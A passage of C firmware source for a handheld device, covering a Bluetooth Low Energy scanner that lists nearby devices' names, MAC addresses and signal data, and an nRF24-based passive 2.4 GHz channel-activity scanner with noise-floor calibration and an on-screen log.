    if (ble_scan_is_active(BleScan_bleScan)) return;
    BleScan_bleResults = ble_scan_results(BleScan_bleScan, 0, false);
    BleScan_bleResultsValid = true;
    BleScan_bgHasResults = (BleScan_bleResults).count > 0;
    BleScan_bgLastScanMs = now;
    BleScan_bgBleScanRunning = false;
    nextScan = now + BleScan_BG_BLE_SCAN_INTERVAL_MS;
  } else if (((int32_t)(now - nextScan)) >= 0) {
    BleScan_bleResultsValid = false;
    ble_scan_set_callback(BleScan_bleScan, NULL, NULL);
    (BleScan_bleScan->max_results = 32);
    BleScan_bgBleScanRunning = ble_scan_start(BleScan_bleScan, 2000, false);
    if (!BleScan_bgBleScanRunning) nextScan = now + 2000;
  }
}

void BleScan_displayScanning(void) {
  BleScan_bleScanClearBody();
  display_set_text_size(&(tft), 1);
  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, BleScan_LIST_HEADER_Y);
  display_print_line_cstr(&(tft), "Scanning.");

  loading(100, ORANGE, 0, 0, 3, true);
  /*
    tft.setCursor(60, LIST_HEADER_Y);
    for (int i = 0; i < 2; i++) {
      for (int j = 0; j <= i; j++) {
        tft.print(".");
        delay(500);
      }
    }
  */
  display_set_cursor(&(tft), 10, BleScan_LIST_HEADER_Y + 15);
  display_print_line_cstr(&(tft), "Wait a moment.");
  sys_sleep_ms(100);
}

void BleScan_startBLEScan(void) {
  pauseBackgroundRadioTasks();
  if (BleScan_bgBleScanRunning) {
    BleScan_stopBgBleScanIfRunning();
  }
  BleScan_displayScanning();
  BleScan_isDetailView = false;
  BleScan_current_page = 0;
  BleScan_currentIndex = 0;
  BleScan_listStartIndex = 0;
  BleScan_isScanning = true;
  BleScan_screenNeedsUpdate = true;
  BleScan_fullScreenUpdate = true;
  BleScan_ensureBleInit();
  BleScan_fgBleScanInProgress = true;
  ble_scan_set_callback(BleScan_bleScan, NULL, NULL);
  (BleScan_bleScan->max_results = 48);
  BleScan_bleResults = ble_scan_results(BleScan_bleScan, 5000, false);
  BleScan_bleResultsValid = true;
  BleScan_fgBleScanInProgress = false;
  BleScan_isScanning = false;
  BleScan_screenNeedsUpdate = true;

  if (BleScan_bleResultsValid) {
    BleScan_bgHasResults = ((BleScan_bleResults).count > 0);
    BleScan_bgLastScanMs = sys_monotonic_ms();
  }

  // Render the result page immediately so the user does not wait for the next
  // loop tick.
  BleScan_updateBLEList();
}

void BleScan_handleButtons(void) {
  unsigned long currentMillis = sys_monotonic_ms();
  if (currentMillis - BleScan_lastButtonPress < BleScan_debounceTime) return;

  int oldPage = BleScan_current_page;

  if (isButtonPressed(BTN_UP)) {
    if (BleScan_currentIndex > 0) {
      BleScan_currentIndex--;
      sys_sleep_ms(200);
      if (!BleScan_isDetailView) {
        BleScan_current_page =
            BleScan_currentIndex / DIV_MAX(1, BleScan_bleDevicesPerPage());
        BleScan_listStartIndex =
            BleScan_current_page * BleScan_bleDevicesPerPage();
        BleScan_fullScreenUpdate = (BleScan_current_page != oldPage);
      } else {
        BleScan_fullScreenUpdate = true;
      }
      BleScan_screenNeedsUpdate = true;
    }
    BleScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_DOWN)) {
    const int deviceCount =
        BleScan_bleResultsValid ? (BleScan_bleResults).count : 0;
    if (BleScan_currentIndex < deviceCount - 1) {
      BleScan_currentIndex++;
      sys_sleep_ms(200);
      if (!BleScan_isDetailView) {
        BleScan_current_page =
            BleScan_currentIndex / DIV_MAX(1, BleScan_bleDevicesPerPage());
        BleScan_listStartIndex =
            BleScan_current_page * BleScan_bleDevicesPerPage();
        BleScan_fullScreenUpdate = (BleScan_current_page != oldPage);
      } else {
        BleScan_fullScreenUpdate = true;
      }
      BleScan_screenNeedsUpdate = true;
    }
    BleScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_RIGHT)) {
    sys_sleep_ms(200);
    if (!BleScan_isScanning) {
      BleScan_isDetailView = !BleScan_isDetailView;
      BleScan_screenNeedsUpdate = true;
      BleScan_fullScreenUpdate = true;
    }
    BleScan_lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_LEFT)) {
    sys_sleep_ms(200);
    if (BleScan_isDetailView) {
      BleScan_isDetailView = false;
      BleScan_fullScreenUpdate = true;
    } else if (!BleScan_isScanning) {
      BleScan_startBLEScan();
      BleScan_fullScreenUpdate = true;
    }
    BleScan_screenNeedsUpdate = true;
    BleScan_lastButtonPress = currentMillis;
  }
}

void BleScan_updateBLEList(void) {
  int deviceCount = BleScan_bleResultsValid ? (BleScan_bleResults).count : 0;
  display_set_text_size(&(tft), 1);

  if (deviceCount <= 0) {
    BleScan_bleScanClearBody();
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, BleScan_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "No devices found.");
    display_set_cursor(&(tft), 10, BleScan_LIST_HEADER_Y + 12);
    display_print_line_cstr(&(tft), "Press Rescan.");
    BleScan_drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + BleScan_bleDevicesPerPage() - 1) /
                         BleScan_bleDevicesPerPage();
  if (BleScan_current_page < 0) BleScan_current_page = 0;
  if (BleScan_current_page > totalPages - 1)
    BleScan_current_page = DIV_MAX(0, totalPages - 1);
  BleScan_listStartIndex = BleScan_current_page * BleScan_bleDevicesPerPage();

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  const bool pageChanged = (BleScan_current_page != last_rendered_page);
  const bool needFull =
      BleScan_fullScreenUpdate || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    BleScan_bleScanClearBody();
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, BleScan_LIST_HEADER_Y);
    display_print_line_cstr(&(tft), "Devices:");

    char page_buf[32];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", BleScan_current_page + 1,
             totalPages);
    display_set_cursor(&(tft), 180, BleScan_LIST_HEADER_Y);
    display_set_text_color_1(&(tft), GREEN);
    display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

    const int end_index = DIV_MIN(
        BleScan_listStartIndex + BleScan_bleDevicesPerPage(), deviceCount);
    for (int i = BleScan_listStartIndex; i < end_index; i++) {
      ble_scan_draw_row(i, (i == BleScan_currentIndex));
    }

    const bool prevDisabled = (BleScan_current_page == 0);
    const bool nextDisabled =
        ((BleScan_current_page + 1) * BleScan_bleDevicesPerPage() >=
         deviceCount);
    BleScan_drawTabBar("Rescan", false, "Prev", prevDisabled, "Next",
                       nextDisabled);

    last_rendered_page = BleScan_current_page;
    last_rendered_index = BleScan_currentIndex;
    return;
  }

  if (last_rendered_index != BleScan_currentIndex) {
    ble_scan_draw_row(last_rendered_index, false);
    ble_scan_draw_row(BleScan_currentIndex, true);
    last_rendered_index = BleScan_currentIndex;
  }
}

void BleScan_displayBLEDetails(void) {
  BleScan_bleScanClearBody();
  display_set_text_size(&(tft), 1);

  const int deviceCount =
      BleScan_bleResultsValid ? (BleScan_bleResults).count : 0;
  if (deviceCount <= 0) {
    BleScan_isDetailView = false;
    BleScan_screenNeedsUpdate = true;
    BleScan_fullScreenUpdate = true;
    return;
  }
  if (BleScan_currentIndex < 0) BleScan_currentIndex = 0;
  if (BleScan_currentIndex >= deviceCount)
    BleScan_currentIndex = deviceCount - 1;

  const ble_device_t* device =
      ble_results_device(&(BleScan_bleResults), BleScan_currentIndex);
  if (!device) {
    BleScan_isDetailView = false;
    BleScan_screenNeedsUpdate = true;
    BleScan_fullScreenUpdate = true;
    return;
  }
  text_t deviceName = TEXT(strlen((ble_device_name(device)).data) > 0
                               ? (ble_device_name(device)).data
                               : "Unknown Device");
  text_t address = TEXT((ble_device_address(device)).data);
  int rssi = device->rssi;
  int txPower = ble_device_tx_power(device);

  display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
  display_set_text_size(&(tft), 1);

  int y = 50;
  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), (text_join_cstr("Device: ", (deviceName).data)).data);
  y += 20;
  display_set_cursor(&(tft), 10, y);
  display_print(&(tft), (text_join_cstr("MAC: ", (address).data)).data);
  y += 20;
  display_set_cursor(&(tft), 10, y);
  char line[64];
  snprintf(line, sizeof(line), "RSSI: %d dBm", rssi);
  display_print(&(tft), (TEXT(line)).data);
  y += 20;
  display_set_cursor(&(tft), 10, y);
  snprintf(line, sizeof(line), "Tx Power: %d dBm", txPower);
  display_print(&(tft), (TEXT(line)).data);

  if ((strlen((ble_device_service_uuid(device)).data) != 0)) {
    y += 20;
    display_set_cursor(&(tft), 10, y);
    display_print(&(tft), "Service UUID: ");
    display_print(&(tft), (TEXT((ble_device_service_uuid(device)).data)).data);
  } else {
    y += 20;
    display_set_cursor(&(tft), 10, y);
    display_print(&(tft), "No Service UUID");
  }
  if (ble_device_has_field(device, 0xff)) {
    text_t manufacturerData = TEXT(ble_device_field_text(device, 0xff));
    y += 20;
    display_set_cursor(&(tft), 10, y);
    display_print(
        &(tft),
        (text_join_cstr("Manufacturer: ", (manufacturerData).data)).data);
  } else {
    y += 20;
    display_set_cursor(&(tft), 10, y);
    display_print(&(tft), "No Manufacturer Data");
  }
  if (ble_device_has_field(device, 0x16)) {
    text_t serviceData = TEXT((ble_device_field_text(device, 0x16)).data);
    y += 30;
    display_set_cursor(&(tft), 10, y);
    display_print(&(tft),
                  (text_join_cstr("Service Data: ", (serviceData).data)).data);
  } else {
    y += 30;
    display_set_cursor(&(tft), 10, y);
    display_print(&(tft), "No Service Data");
  }

  BleScan_drawTabBar("Rescan", false, "", true, "Back", false);
}

void BleScan_runUI(void) {
  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!BleScan_uiDrawn) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (BleScan_icons[i] != NULL) {
        display_draw_bitmap(&(tft), BleScan_iconX[i], iconY, BleScan_icons[i],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    BleScan_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), BleScan_iconX[activeIcon], iconY,
                          BleScan_icons[activeIcon], ICON_SIZE, ICON_SIZE,
                          TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!BleScan_isScanning) {
            BleScan_startBLEScan();
          }
          break;
        case 1:
          feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      const uint32_t nowMs = sys_monotonic_ms();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = sys_monotonic_ms();
        return;
      }
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > BleScan_iconX[i] && x < BleScan_iconX[i] + ICON_SIZE) {
            if (BleScan_icons[i] != NULL && animationState == 0) {
              display_draw_bitmap(&(tft), BleScan_iconX[i], iconY,
                                  BleScan_icons[i], ICON_SIZE, ICON_SIZE,
                                  TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = sys_monotonic_ms();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!BleScan_isScanning) {
        const int deviceCount =
            BleScan_bleResultsValid ? (BleScan_bleResults).count : 0;

        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
          const bool prevDisabled = (BleScan_current_page == 0);
          const bool nextDisabled =
              ((BleScan_current_page + 1) * BleScan_bleDevicesPerPage() >=
               deviceCount);

          if (x >= 0 && x <= 57) {
            BleScan_drawButton(0, 304, 57, 16, "Rescan", true, false);
            sys_sleep_ms(50);
            BleScan_startBLEScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !BleScan_isDetailView &&
                     !prevDisabled) {
            BleScan_drawButton(117, 304, 57, 16, "Prev", true, false);
            BleScan_current_page--;
            if (BleScan_current_page < 0) BleScan_current_page = 0;
            BleScan_currentIndex =
                BleScan_current_page * BleScan_bleDevicesPerPage();
            BleScan_listStartIndex =
                BleScan_current_page * BleScan_bleDevicesPerPage();
            BleScan_screenNeedsUpdate = true;
            BleScan_fullScreenUpdate = true;
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (BleScan_isDetailView) {
              BleScan_drawButton(177, 304, 57, 16, "Back", true, false);
              BleScan_isDetailView = false;
              BleScan_screenNeedsUpdate = true;
              BleScan_fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              BleScan_drawButton(177, 304, 57, 16, "Next", true, false);
              BleScan_current_page++;
              BleScan_currentIndex =
                  BleScan_current_page * BleScan_bleDevicesPerPage();
              BleScan_listStartIndex =
                  BleScan_current_page * BleScan_bleDevicesPerPage();
              BleScan_screenNeedsUpdate = true;
              BleScan_fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!BleScan_isDetailView) {
          const int listMaxY =
              BleScan_LIST_FIRST_ROW_Y +
              (BleScan_bleDevicesPerPage() * BleScan_LIST_ROW_H);
          if (deviceCount > 0 && y >= BleScan_LIST_FIRST_ROW_Y &&
              y < listMaxY) {
            const int row = (y - BleScan_LIST_FIRST_ROW_Y) / BleScan_LIST_ROW_H;
            const int idx =
                (BleScan_current_page * BleScan_bleDevicesPerPage()) + row;
            if (idx >= 0 && idx < deviceCount) {
              BleScan_currentIndex = idx;
              BleScan_isDetailView = true;
              BleScan_screenNeedsUpdate = true;
              BleScan_fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void BleScan_bleScanSetup(void) {
  BleSniffer_exit();
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  BleScan_bleScanUpdateNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  BleScan_uiDrawn = false;
  BleScan_runUI();

  setupTouchscreen();

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
#endif

  BleScan_ensureBleInit();

  // when background scan is on.
  if ((*settings()).autoBleScan && BleScan_bgHasResults &&
      BleScan_bleResultsValid && (BleScan_bleResults).count > 0) {
    BleScan_current_page = 0;
    BleScan_currentIndex = 0;
    BleScan_listStartIndex = 0;
    BleScan_isDetailView = false;
    BleScan_screenNeedsUpdate = true;
    BleScan_fullScreenUpdate = true;
    BleScan_updateBLEList();
  } else {
    BleScan_startBLEScan();
  }

  redrawTouchButtonBar();
}

void BleScan_bleScanLoop(void) {
  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  BleScan_handleButtons();

  BleScan_runUI();
  updateStatusBar();

  if (BleScan_screenNeedsUpdate) {
    BleScan_screenNeedsUpdate = false;
    if (BleScan_isScanning) {
      BleScan_displayScanning();
    } else if (!BleScan_isDetailView) {
      BleScan_updateBLEList();
    } else {
      BleScan_displayBLEDetails();
    }
    if (BleScan_fullScreenUpdate) BleScan_fullScreenUpdate = false;
  }
}

void BleScan_startBackgroundScanner(void) {
  BleScan_bgBootMs = sys_monotonic_ms();
}

int BleScan_getLastCount(void) {
  if (!(*settings()).autoBleScan) return 0;
  return BleScan_bleResultsValid ? (BleScan_bleResults).count : 0;
}

void BleScan_exit(void) {
  BleScan_fgBleScanInProgress = false;
  if (BleScan_bgBleScanRunning) {
    BleScan_stopBgBleScanIfRunning();
  }
  if (BleScan_isScanning && BleScan_bleScan) {
    ble_scan_stop(BleScan_bleScan);
    BleScan_isScanning = false;
  }
}

#define CE NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

#define CHANNELS 128
int Scanner_channel[CHANNELS];

#define N 128
uint8_t Scanner_values[N];

static bool Scanner_uiDrawn = false;

enum { Scanner_SCAN_SWEEPS = 25 };
enum { Scanner_DISPLAY_SWEEPS = 10 };
enum { Scanner_RX_SETTLE_US = 100 };
enum { Scanner_RPD_DWELL_US = 50 };
enum { Scanner_UI_THROTTLE_MS = 35 };
enum { Scanner_BUTTON_POLL_STRIDE = 8 };

#define _NRF24_CONFIG 0x00
#define _NRF24_EN_AA 0x01
#define _NRF24_RF_CH 0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD 0x09

int Scanner_backgroundNoise[CHANNELS] = {0};

volatile bool Scanner_scanning = true;

enum { Scanner_kScannerGraphTop = 190 };
enum { Scanner_kScannerLogBottom = Scanner_kScannerGraphTop - 6 };
enum { Scanner_kScannerToolbarBottom = 36 };
enum { Scanner_kScannerToolbarGap = 8 };
enum { Scanner_kScannerBoxPad = 4 };
enum { Scanner_kScannerBoxHeaderH = 15 };
enum {
  Scanner_kScannerStatusY = Scanner_kScannerToolbarBottom +
  Scanner_kScannerToolbarGap
};
enum { Scanner_kScannerGraphMarginX = 6 };
enum { Scanner_kScannerBarColGap = 10 };
enum { Scanner_kScannerBarsPerCol = 64 };
enum { Scanner_kScannerStatusLineCount = 6 };
enum {
  Scanner_kScannerStatusTextY = Scanner_kScannerStatusY +
  Scanner_kScannerBoxHeaderH
};
enum { Scanner_kScannerStatusBoxH = 91 };
enum { Scanner_kScannerLogGap = 4 };
enum { Scanner_kScannerLogBoxH = 49 };
enum {
  Scanner_kScannerLogBoxTop = Scanner_kScannerStatusY +
  Scanner_kScannerStatusBoxH + Scanner_kScannerLogGap
};
enum {
  Scanner_kScannerLogStartY = Scanner_kScannerLogBoxTop +
  Scanner_kScannerBoxHeaderH
};
enum {
  Scanner_kScannerLogEndY = Scanner_kScannerLogBoxTop +
  Scanner_kScannerLogBoxH - 2
};

#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT 180
#undef LINE_HEIGHT
#define LINE_HEIGHT 12
#undef MAX_LINES
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

enum { Scanner_Buffer_COUNT = MAX_LINES, Scanner_Buffer_OFFSET = 0 };
_Static_assert(Scanner_Buffer_OFFSET + Scanner_Buffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define Scanner_Buffer                  \
  (*(text_t(*)[Scanner_Buffer_COUNT]) & \
   feature_text_slots[Scanner_Buffer_OFFSET])
uint16_t Scanner_Buffercolor[MAX_LINES];
int Scanner_Index = 0;

bool Scanner_isSelectButtonPressed(void) { return isButtonPressed(BTN_SELECT); }

static rf24_t Scanner_spectrum_radio = {.cePin_ = NRF24_SCAN_CE,
                                        .csnPin_ = NRF24_SCAN_CSN,
                                        .spiSpeed_ = 8000000,
                                        .payloadSize_ = 32,
                                        .addrWidth_ = 5};
uint8_t Scanner_getRegister(uint8_t r) {
  return rf24_read_register_1(&(Scanner_spectrum_radio), r);
}
bool Scanner_carrierDetected(void) {
  return rf24_test_rpd(&(Scanner_spectrum_radio));
}
void Scanner_setRegister(uint8_t r, uint8_t v) {
  rf24_write_register_2(&(Scanner_spectrum_radio), r, v);
}

void Scanner_setChannel(uint8_t Scanner_channel) {
  Scanner_setRegister(_NRF24_RF_CH, Scanner_channel);
}

void Scanner_powerUp(void) {
  Scanner_setRegister(_NRF24_CONFIG, Scanner_getRegister(_NRF24_CONFIG) | 0x02);
  esp_rom_delay_us(130);
}

void Scanner_powerDown(void) {
  Scanner_setRegister(_NRF24_CONFIG,
                      Scanner_getRegister(_NRF24_CONFIG) & ~0x02);
}

void Scanner_enable(void) { gpio_set_level(((gpio_num_t)(CE)), 1); }

void Scanner_disable(void) { gpio_set_level(((gpio_num_t)(CE)), 0); }

void Scanner_setRX(void) {
  Scanner_setRegister(_NRF24_CONFIG, Scanner_getRegister(_NRF24_CONFIG) | 0x01);
  Scanner_enable();
  esp_rom_delay_us(100);
}

void Scanner_scroll(void) {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Scanner_Buffer[i] = Scanner_Buffer[i + 1];
    Scanner_Buffercolor[i] = Scanner_Buffercolor[i + 1];
  }
}

static void scanner_redraw_log_line(int bufIndex) {
  if (bufIndex < 3) {
    return;
  }
  const int yPos = Scanner_kScannerLogStartY + (bufIndex - 3) * LINE_HEIGHT;
  if (yPos + LINE_HEIGHT > Scanner_kScannerLogEndY) {
    return;
  }
  display_fill_rect(&(tft), 8, yPos, display_width(&(tft)) - 16, LINE_HEIGHT,
                    TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), Scanner_Buffercolor[bufIndex], TFT_BLACK);
  display_set_cursor(&(tft), 8, yPos);
  display_print(&(tft), (Scanner_Buffer[bufIndex]).data);
}
void Scanner_Print(text_t text, uint16_t color, bool extraSpace) {
  const bool scrolled = (Scanner_Index >= MAX_LINES - 1);
  if (scrolled) {
    Scanner_scroll();
    Scanner_Index = MAX_LINES - 1;
  }

  const int firstNewIndex = Scanner_Index;
  Scanner_Buffer[Scanner_Index] = text;
  Scanner_Buffercolor[Scanner_Index] = color;
  Scanner_Index++;

  if (extraSpace && Scanner_Index < MAX_LINES) {
    Scanner_Buffer[Scanner_Index] = TEXT("");
    Scanner_Buffercolor[Scanner_Index] = WHITE;
    Scanner_Index++;
  }

  if (scrolled) {
    for (int i = 3; i < Scanner_Index; i++) {
      scanner_redraw_log_line(i);
    }
    return;
  }

  for (int i = firstNewIndex; i < Scanner_Index; i++) {
    scanner_redraw_log_line(i);
  }
}

static unsigned long Scanner_s_scannerLastBtnMs = 0;
static const unsigned long Scanner_kScannerNavDebounceMs = 80;

void Scanner_calibrateBackgroundNoise(void);
void Scanner_scan(void);
static text_t Scanner_scannerChannelGHzText(int ch);
static text_t Scanner_scannerBandHint(int ch);

static void Scanner_scannerWaitNavRelease(int pin) {
  const uint32_t t0 = sys_monotonic_ms();
  while (isTouchNavButtonPressed(pin) && sys_monotonic_ms() - t0 < 400) {
    sys_sleep_ms(5);
  }
  sys_sleep_ms(30);
}

void Scanner_scannerHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - Scanner_s_scannerLastBtnMs < Scanner_kScannerNavDebounceMs) {
    return;
  }

  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    Scanner_calibrateBackgroundNoise();
    Scanner_s_scannerLastBtnMs = sys_monotonic_ms();
    Scanner_scannerWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    Scanner_scan();
    Scanner_s_scannerLastBtnMs = sys_monotonic_ms();
    Scanner_scannerWaitNavRelease(BTN_DOWN);
  }
}

static void Scanner_scannerPollNavButtons(void) {
  maintainTouchNavBar();
  if (feature_active &&
      (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    Scanner_scanning = false;
    return;
  }
  Scanner_scannerHandleNavButtons();
}

void Scanner_calibrateBackgroundNoise(void) {
  Scanner_Print(TEXT("[!] Calibrating noise floor..."), UI_TEXT, false);

  for (int i = 0; i < 2; i++) {
    Scanner_disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {
        if ((i % Scanner_BUTTON_POLL_STRIDE) == 0) {
          Scanner_scannerPollNavButtons();
        }

        Scanner_setRegister(_NRF24_RF_CH, (uint8_t)i);
        Scanner_enable();
        esp_rom_delay_us(Scanner_RX_SETTLE_US + Scanner_RPD_DWELL_US);
        Scanner_disable();
        if (Scanner_carrierDetected()) Scanner_channel[i]++;
      }
    }
    for (int j = 0; j < CHANNELS; j++) {
      Scanner_backgroundNoise[j] += Scanner_channel[j];
    }
  }

  int maxNoiseCh = 0;
  int maxNoise = 0;
  for (int i = 0; i < CHANNELS; i++) {
    Scanner_backgroundNoise[i] /= 5;
    if (Scanner_backgroundNoise[i] > maxNoise) {
      maxNoise = Scanner_backgroundNoise[i];
      maxNoiseCh = i;
    }
  }

  char line[80];
  snprintf(line, sizeof(line), "[+] Calibrate done  Ch%d %.8sGHz", maxNoiseCh,
           (Scanner_scannerChannelGHzText(maxNoiseCh)).data);
  Scanner_Print(TEXT(line), UI_WARN, false);
}

void Scanner_scan(void) {
  Scanner_Print(TEXT("[!] Scan refresh..."), UI_TEXT, false);
  memset(Scanner_channel, 0, sizeof(Scanner_channel));
  Scanner_disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {
      if ((i % Scanner_BUTTON_POLL_STRIDE) == 0) {
        Scanner_scannerPollNavButtons();
      }

      Scanner_setRegister(_NRF24_RF_CH, (uint8_t)i);
      Scanner_enable();
      esp_rom_delay_us(Scanner_RX_SETTLE_US + Scanner_RPD_DWELL_US);
      Scanner_disable();
      if (Scanner_carrierDetected()) Scanner_channel[i]++;
    }
  }

  int peakCh = 0;
  int peakHits = 0;
  int active = 0;
  for (int i = 0; i < CHANNELS; i++) {
    if (Scanner_channel[i] > 0) {
      active++;
    }
    if (Scanner_channel[i] > peakHits) {
      peakHits = Scanner_channel[i];
      peakCh = i;
    }
  }
  if (peakHits > 0) {
    char line[80];
    snprintf(line, sizeof(line), "[+] Scan done  %d hit(s)  peak Ch%d", active,
             peakCh);
    Scanner_Print(TEXT(line), UI_WARN, false);
  } else {
    Scanner_Print(TEXT("[*] Scan done  no carriers"), UI_DIM_TEXT, false);
  }
}

void Scanner_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_undo, bitmap_icon_start, bitmap_icon_go_back};

  if (!Scanner_uiDrawn) {
    display_fill_rect(&(tft), 0, 20, 160, 16, DARK_GRAY);
    display_set_text_color_2(&(tft), UI_TEXT, DARK_GRAY);
    display_set_cursor(&(tft), 35, 24);
    display_print(&(tft), "2.4GHz Scanner");

    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_fill_rect(&(tft), 160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, UI_ICON);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    Scanner_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          ICON_SIZE, ICON_SIZE, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          Scanner_calibrateBackgroundNoise();
          break;
        case 1:
          Scanner_scan();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 2) {
                feature_exit_requested = true;

                Scanner_scanning = false;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void Scanner_scanChannels(void) {
  Scanner_disable();
  static uint32_t lastUI = 0;
  for (int j = 0; j < (int)Scanner_SCAN_SWEEPS && Scanner_scanning; j++) {
    for (int i = 0; i < CHANNELS && Scanner_scanning; i++) {
      if ((i % Scanner_BUTTON_POLL_STRIDE) == 0 &&
          Scanner_isSelectButtonPressed()) {
